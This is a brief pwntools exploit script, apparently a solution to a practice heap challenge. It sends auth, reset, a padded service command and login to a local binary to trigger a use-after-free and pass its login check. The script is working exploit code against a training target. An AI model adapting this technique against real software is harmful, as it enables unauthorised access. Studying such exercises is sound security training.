from pwn import *

# context.log_level = "debug"

p = process("./3Heap/heap")

payload1 = b"auth man"
payload2 = b"reset"
# The strlen range must be [24, 40)
payload3 = b"service" + b"A" * 36
payload4 = b"login"

# pause()
p.sendlineafter("]", payload1)
p.sendlineafter("]", payload2)
p.sendlineafter("]", payload3)
p.sendlineafter("]", payload4)
p.interactive()